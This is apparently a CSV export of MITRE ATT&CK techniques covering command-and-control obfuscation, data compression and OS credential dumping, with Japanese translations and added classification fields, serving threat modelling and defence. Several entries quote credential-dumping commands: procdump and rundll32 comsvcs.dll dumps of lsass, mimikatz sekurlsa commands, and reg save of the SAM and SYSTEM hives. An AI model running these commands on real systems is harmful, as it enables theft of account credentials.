Technique_ID,Parent_Technique_ID,Technique_Name,技術名,Description(E),説明(E),Tactics,Platforms,Action_Type,Progression_Role,Environment_Requirements,Req_Status,Target_Asset_Candidates,Knowledge_Attributes,Ito_Steps,Primary_Step,Ito_Category_IDs,Ito_Category_Names,Primary_Ito_Category_ID,Primary_Ito_Category_Name,Ito_Tactic_IDs,STIX_Object_ID,Created,Modified,Applies_To_Asset_Class,Required_Platform_Tags,Required_Capabilities,Required_Keyword_Tags
T1001,,Data Obfuscation,データ難読化,"Adversaries may obfuscate command and control traffic to make it more difficult to detect.(Citation: Bitdefender FunnyDream Campaign November 2020) Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols.",敵対者は、コマンド＆コントロール通信を難読化して検出を困難にする場合があります（引用元：Bitdefender FunnyDream キャンペーン 2020年11月）。コマンド＆コントロール（C2）通信は、内容を発見または解読しにくくし、通信を目立たなくしてコマンドを見えなくするために、隠蔽（必ずしも暗号化とは限らない）されます。 これには、プロトコルトラフィックへのジャンクデータの追加、ステガノグラフィの使用、正当なプロトコルの偽装など、多くの手法が含まれます。,command-and-control,Linux;macOS;Windows;ESXi,script_command_execution,remote_control,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--ad255bfe-a9e6-4b52-a258-8d3462abe842,2017-05-31T21:30:18.931Z,2025-04-15T19:58:57.412Z,,,,
T1001.001,T1001,Junk Data,ジャンクデータ,"Adversaries may add junk data to protocols used for command and control to make detection more difficult.(Citation: FireEye SUNBURST Backdoor December 2020) By adding random or meaningless data to the protocols used for command and control, adversaries can prevent trivial methods for decoding, deciphering, or otherwise analyzing the traffic. Examples may include appending/prepending data with junk characters or writing junk characters between significant characters.",攻撃者は、コマンド＆コントロールに使用されるプロトコルにジャンクデータを追加し、検出を困難にすることがあります。(引用元: FireEye SUNBURST Backdoor 2020年12月)コマンド＆コントロールに使用されるプロトコルにランダムまたは無意味なデータを追加することで、攻撃者は、トラフィックのデコード、解読、その他の分析を行う単純な手法を妨げることができます。例としては、ジャンク文字でデータを追加/前置したり、重要な文字の間にジャンク文字を書き込んだりすることが挙げられます。,command-and-control,Linux;macOS;Windows;ESXi,script_command_execution,remote_control,endpoint_execution,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--f7c0689c-4dbd-489b-81be-7cb7c7079ade,2020-03-15T00:30:25.444Z,2025-04-15T19:59:22.822Z,,,,
T1001.002,T1001,Steganography,ステガノグラフィ,"Adversaries may use steganographic techniques to hide command and control traffic to make detection efforts more difficult. Steganographic techniques can be used to hide data in digital messages that are transferred between systems. This hidden information can be used for command and control of compromised systems. In some cases, the passing of files embedded using steganography, such as image or document files, can be used for command and control.",攻撃者は、コマンド＆コントロール通信を隠蔽し検知を困難にするため、ステガノグラフィ技術を用いる可能性がある。ステガノグラフィ技術は、システム間で転送されるデジタルメッセージ内にデータを隠蔽するために使用される。この隠された情報は、侵害されたシステムのコマンド＆コントロールに利用される。場合によっては、画像ファイルや文書ファイルなどステガノグラフィで埋め込まれたファイルの受け渡し自体が、コマンド＆コントロールに利用されることもある。,command-and-control,Linux;macOS;Windows;ESXi,script_command_execution,remote_control,endpoint_execution;file_storage_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--eec23884-3fa1-4d8a-ac50-6f104d51e235,2020-03-15T00:37:58.963Z,2025-04-25T14:48:29.907Z,,,,
T1001.003,T1001,Protocol or Service Impersonation,プロトコルまたはサービスのなりすまし,"Adversaries may impersonate legitimate protocols or web service traffic to disguise command and control activity and thwart analysis efforts. By impersonating legitimate protocols or web services, adversaries can make their command and control traffic blend in with legitimate network traffic. Adversaries may impersonate a fake SSL/TLS handshake to make it look like subsequent traffic is SSL/TLS encrypted, potentially interfering with some security tooling, or to make the traffic look like it is related with a trusted entity. Adversaries may also leverage legitimate protocols to impersonate expected web traffic or trusted services. For example, adversaries may manipulate HTTP headers, URI endpoints, SSL certificates, and transmitted data to disguise C2 communications or mimic legitimate services such as Gmail, Google Drive, and Yahoo Messenger.(Citation: ESET Okrum July 2019)(Citation: Malleable-C2-U42)",攻撃者は、正当なプロトコルやWebサービストラフィックを偽装し、C&C活動を隠蔽して分析を妨害する可能性がある。正当なプロトコルやWebサービスを偽装することで、攻撃者はC&Cトラフィックを正当なネットワークトラフィックに紛れ込ませることができる。 攻撃者は偽のSSL/TLSハンドシェイクを偽装し、後続のトラフィックがSSL/TLSで暗号化されているように見せかけることで、一部のセキュリティツールの動作を妨害したり、トラフィックを信頼できるエンティティに関連付けられたように見せたりすることがあります。 攻撃者はまた、正当なプロトコルを利用して、予想されるWebトラフィックや信頼されたサービスを偽装することもある。例えば、攻撃者はHTTPヘッダー、URIエンドポイント、SSL証明書、送信データを操作して、C2通信を偽装したり、Gmail、Google Drive、Yahoo Messengerなどの正当なサービスを模倣したりする。(引用: ESET Okrum 2019年7月)(引用: Malleable-C2-U42),command-and-control,Linux;Windows;macOS;ESXi,script_command_execution,remote_control,endpoint_execution;network_connectivity;email_infrastructure,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0011,attack-pattern--c325b232-d5bc-4dde-a3ec-71f3db9e8adc,2020-03-15T00:40:27.503Z,2025-04-15T19:59:05.377Z,,,,
T1002,,Data Compressed,データ圧縮,"An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network. The compression is done separately from the exfiltration channel and is performed using a custom program or algorithm, or a more common compression library or utility such as 7zip, RAR, ZIP, or zlib.",攻撃者は、収集したデータ（例：機密文書）をネットワーク経由で送信する量を最小化し、持ち運び可能にするため、漏洩前に圧縮する場合がある。圧縮は漏洩経路とは別に行われ、カスタムプログラムやアルゴリズム、あるいは7zip、RAR、ZIP、zlibなどの一般的な圧縮ライブラリやユーティリティを使用して実施される。,exfiltration,Linux;Windows;macOS,data_collection,data_outflow,network_connectivity,specified,Business Workstation;File Server;My Number Administrative System on GovCloud;Server (On-Prem/VM),revoked;has_created_ts;has_modified_ts,S4,S4,C04,Final Impact,C04,Final Impact,TA0010,attack-pattern--b9f5dbe2-4c55-4fc5-af2e-d42c1d182ec4,2017-05-31T21:30:19.338Z,2025-04-25T15:16:03.119Z,,,,
T1003,,OS Credential Dumping,OS認証情報ダンプ,"Adversaries may attempt to dump credentials to obtain account login and credential material, normally in the form of a hash or a clear text password. Credentials can be obtained from OS caches, memory, or structures.(Citation: Brining MimiKatz to Unix) Credentials can then be used to perform [Lateral Movement](https://attack.mitre.org/tactics/TA0008) and access restricted information. Several of the tools mentioned in associated sub-techniques may be used by both adversaries and professional security testers. Additional custom tools likely exist as well.",攻撃者は、アカウントのログイン情報や認証情報を取得するために、通常ハッシュまたは平文パスワードの形式で認証情報をダンプしようとする。認証情報はOSキャッシュ、メモリ、または構造体から取得可能である（出典: Brining MimiKatz to Unix）。取得した認証情報は[横方向移動](https://attack.mitre.org/tactics/TA0008)の実行や制限付き情報へのアクセスに使用される。 関連するサブテクニックで言及されているツールのいくつかは、攻撃者とプロのセキュリティテスターの両方が使用する場合があります。追加のカスタムツールも存在する可能性があります。,credential-access,Windows;Linux;macOS,credential_abuse,credential_gain,authentication_system;network_connectivity;logging_monitoring,specified,Business Workstation;Log / Monitoring Server;Server (On-Prem/VM),has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--0a3ead4e-6d47-4ccb-854c-a6a4f9d96b22,2017-05-31T21:30:19.735Z,2025-04-15T22:53:37.617Z,,,,
T1003.001,T1003,LSASS Memory,LSASSメモリ,"Adversaries may attempt to access credential material stored in the process memory of the Local Security Authority Subsystem Service (LSASS). After a user logs on, the system generates and stores a variety of credential materials in LSASS process memory. These credential materials can be harvested by an administrative user or SYSTEM and used to conduct [Lateral Movement](https://attack.mitre.org/tactics/TA0008) using [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550). As well as in-memory techniques, the LSASS process memory can be dumped from the target host and analyzed on a local system. For example, on the target host use procdump: * <code>procdump -ma lsass.exe lsass_dump</code> Locally, mimikatz can be run using: * <code>sekurlsa::Minidump lsassdump.dmp</code> * <code>sekurlsa::logonPasswords</code> Built-in Windows tools such as `comsvcs.dll` can also be used: * <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full</code>(Citation: Volexity Exchange Marauder March 2021)(Citation: Symantec Attacks Against Government Sector) Similar to [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012), the silent process exit mechanism can be abused to create a memory dump of `lsass.exe` through Windows Error Reporting (`WerFault.exe`).(Citation: Deep Instinct LSASS) Windows Security Support Provider (SSP) DLLs are loaded into LSASS process at system start. Once loaded into the LSA, SSP DLLs have access to encrypted and plaintext passwords that are stored in Windows, such as any logged-on user's Domain password or smart card PINs. The SSP configuration is stored in two Registry keys: <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> and <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>. An adversary may modify these Registry keys to add new SSPs, which will be loaded the next time the system boots, or when the AddSecurityPackage Windows API function is called.(Citation: Graeber 2014) The following SSPs can be used to access credentials: * Msv: Interactive logons, batch logons, and service logons are done through the MSV authentication package. * Wdigest: The Digest Authentication protocol is designed for use with Hypertext Transfer Protocol (HTTP) and Simple Authentication Security Layer (SASL) exchanges.(Citation: TechNet Blogs Credential Protection) * Kerberos: Preferred for mutual client-server domain authentication in Windows 2000 and later. * CredSSP: Provides SSO and Network Level Authentication for Remote Desktop Services.(Citation: TechNet Blogs Credential Protection)",攻撃者は、ローカルセキュリティ機関サブシステムサービス（LSASS）のプロセスメモリに保存された認証情報を取得しようとする可能性があります。ユーザーがログオンすると、システムは様々な認証情報を生成し、LSASSプロセスメモリに保存します。 これらの認証情報は、管理者ユーザーまたは SYSTEM によって収集され、[代替認証情報の使用](https://attack.mitre.org/techniques/T1550) による [横方向の移動](https://attack.mitre.org/tactics/TA0008) に利用される可能性があります。 メモリ内手法に加え、LSASSプロセスメモリは標的ホストからダンプし、ローカルシステムで解析可能です。例：標的ホストでprocdumpを使用 * <code>procdump -ma lsass.exe lsass_dump</code> ローカルではmimikatzを以下で実行可能 * <code>sekurlsa::Minidump lsassdump.dmp</code> * <code>sekurlsa::logonPasswords</code> `comsvcs.dll`などのWindows組み込みツールも使用可能: * <code>rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump PID lsass.dmp full</code>(出典: Volexity Exchange Marauder 2021年3月)(引用元: Symantec Attacks Against Government Sector) [画像ファイル実行オプション注入](https://attack.mitre.org/techniques/T1546/012)と同様に、サイレントプロセス終了メカニズムを悪用し、Windowsエラー報告(`WerFault.exe`)を通じて`lsass.exe`のメモリダンプを作成できる。(引用: Deep Instinct LSASS) Windows セキュリティサポートプロバイダ (SSP) DLL は、システム起動時に LSASS プロセスにロードされます。LSA にロードされると、SSP DLL は、ログオンしているユーザーのドメインパスワードやスマートカードの PIN など、Windows に保存されている暗号化されたパスワードや平文のパスワードにアクセスできるようになります。 SSP構成は2つのレジストリキーに保存される：<code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages</code> および <code>HKLM\SYSTEM\CurrentControlSet\Control\Lsa\OSConfig\Security Packages</code>。 攻撃者はこれらのレジストリキーを改変し、新しいSSPを追加できます。追加されたSSPは、システムの次回起動時、またはAddSecurityPackage Windows API関数が呼び出された際にロードされます。(引用: Graeber 2014) 以下のSSPを使用して認証情報にアクセスできます:* Msv: 対話型ログオン、バッチログオン、サービスログオンはMSV認証パッケージを介して行われます。 * Wdigest: ダイジェスト認証プロトコルは、ハイパーテキスト転送プロトコル（HTTP）および簡易認証セキュリティ層（SASL）交換での使用を目的としています。（引用元: TechNet Blogs Credential Protection）* Kerberos: Windows 2000以降におけるクライアント-サーバ相互ドメイン認証に推奨されます。 * CredSSP: リモートデスクトップサービス向けにシングルサインオン（SSO）とネットワークレベル認証を提供します。（引用元: TechNet Blogs Credential Protection）,credential-access,Windows,credential_abuse,credential_gain,authentication_system;user_interaction;endpoint_execution;network_connectivity;email_infrastructure;cloud_control_plane;file_storage_access;logging_monitoring,specified,AD / Directory Server;Business Workstation;Log / Monitoring Server;Mail / Collaboration;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--65f2d882-3f41-4d48-8a06-29af77ec9f90,2020-02-11T18:41:44.783Z,2025-04-15T22:45:12.834Z,,,,
T1003.002,T1003,Security Account Manager,セキュリティアカウントマネージャー,"Adversaries may attempt to extract credential material from the Security Account Manager (SAM) database either through in-memory techniques or through the Windows Registry where the SAM database is stored. The SAM is a database file that contains local accounts for the host, typically those found with the <code>net user</code> command. Enumerating the SAM database requires SYSTEM level access. A number of tools can be used to retrieve the SAM file through in-memory techniques: * pwdumpx.exe * [gsecdump](https://attack.mitre.org/software/S0008) * [Mimikatz](https://attack.mitre.org/software/S0002) * secretsdump.py Alternatively, the SAM can be extracted from the Registry with Reg: * <code>reg save HKLM\sam sam</code> * <code>reg save HKLM\system system</code> Creddump7 can then be used to process the SAM database locally to retrieve hashes.(Citation: GitHub Creddump7) Notes: * RID 500 account is the local, built-in administrator. * RID 501 is the guest account. * User accounts start with a RID of 1,000+.","攻撃者は、メモリ内技術またはSAMデータベースが保存されているWindowsレジストリを通じて、セキュリティアカウントマネージャー（SAM）データベースから認証情報を抽出しようとする可能性があります。SAMは、ホストのローカルアカウント（通常は<code>net user</code>コマンドで確認できるもの）を含むデータベースファイルです。SAMデータベースの列挙にはSYSTEMレベルのアクセス権限が必要です。 インメモリ手法でSAMファイルを取得するツールには以下があります：* pwdumpx.exe* [gsecdump](https://attack.mitre.org/software/S0008)* [Mimikatz](https://attack.mitre.org/software/S0002) * secretsdump.py あるいは、レジストリから Reg を使用して SAM を抽出することも可能です： * <code>reg save HKLM\sam sam</code> * <code>reg save HKLM\system system</code> その後、Creddump7 を使用して SAM データベースをローカルで処理し、ハッシュを取得できます。(引用元: GitHub Creddump7) 注記: * RID 500 アカウントはローカルの組み込み管理者アカウントです。 * RID 501 はゲストアカウントです。 * ユーザーアカウントは RID 1,000 以上から始まります。",credential-access,Windows,credential_abuse,credential_gain,authentication_system;privileged_account;user_interaction;endpoint_execution;file_storage_access;database_access,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--1644e709-12d2-41e5-a60f-3470991f5011,2020-02-11T18:42:07.281Z,2025-04-15T23:04:51.689Z,,,,
T1003.003,T1003,NTDS,NTDS,"Adversaries may attempt to access or create a copy of the Active Directory domain database in order to steal credential information, as well as obtain other information about domain members such as devices, users, and access rights. By default, the NTDS file (NTDS.dit) is located in <code>%SystemRoot%\NTDS\Ntds.dit</code> of a domain controller.(Citation: Wikipedia Active Directory) In addition to looking for NTDS files on active Domain Controllers, adversaries may search for backups that contain the same or similar information.(Citation: Metcalf 2015) The following tools and techniques can be used to enumerate the NTDS file and the contents of the entire Active Directory hashes. * Volume Shadow Copy * secretsdump.py * Using the in-built Windows tool, ntdsutil.exe * Invoke-NinjaCopy",攻撃者は、資格情報窃取やドメインメンバー（デバイス、ユーザー、アクセス権限など）に関する情報取得を目的として、Active Directoryドメインデータベースへのアクセスやそのコピー作成を試みる可能性があります。デフォルトでは、NTDSファイル（NTDS.dit）はドメインコントローラーの<code>%SystemRoot%\NTDS\Ntds.dit</code>に配置されています。(出典: Wikipedia Active Directory) アクティブなドメイン コントローラー上の NTDS ファイルを探すことに加え、攻撃者は同じまたは類似の情報を含むバックアップを検索する場合があります。(出典: Metcalf 2015) 以下のツールと手法を使用して、NTDS ファイルおよび Active Directory ハッシュ全体の内容を列挙できます。 * ボリュームシャドウコピー * secretsdump.py * Windows組み込みツール ntdsutil.exe の使用 * Invoke-NinjaCopy,credential-access,Windows,credential_abuse,credential_gain,authentication_system;privileged_account;user_interaction;file_storage_access;database_access,specified,AD / Directory Server;Backup Server;Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--edf91964-b26e-4b4a-9600-ccacd7d7df24,2020-02-11T18:42:35.572Z,2025-04-15T19:59:19.862Z,,,,
T1003.004,T1003,LSA Secrets,LSAシークレット,"Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets) [Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)",ホストへの SYSTEM アクセス権を持つ攻撃者は、サービスアカウントの認証情報など、様々な認証情報を含むローカルセキュリティ機関（LSA）のシークレットへのアクセスを試みる可能性があります。(引用: Passcape LSA Secrets)(引用: Microsoft AD Admin Tier Model)(引用: Tilbury Windows Credentials) LSAシークレットはレジストリの<code>HKEY_LOCAL_MACHINE\SECURITY\Policy\Secrets</code>に保存される。LSAシークレットはメモリからもダンプ可能。(引用: ired LSAシークレットのダンプ) [Reg](https://attack.mitre.org/software/S0075)はレジストリからの抽出に使用できます。[Mimikatz](https://attack.mitre.org/software/S0002)はメモリからのシークレット抽出に使用できます。(引用: ired LSAシークレットのダンプ),credential-access,Windows,credential_abuse,credential_gain,authentication_system;cloud_control_plane,specified,Business Workstation;Server (On-Prem/VM),subtechnique;has_created_ts;has_modified_ts,S3,S3,C03,Secondary Intrusion,C03,Secondary Intrusion,TA0006,attack-pattern--1ecfdab8-7d59-4c98-95d4-dc41970f57fc,2020-02-21T16:22:09.493Z,2025-04-15T22:44:50.491Z,,,,
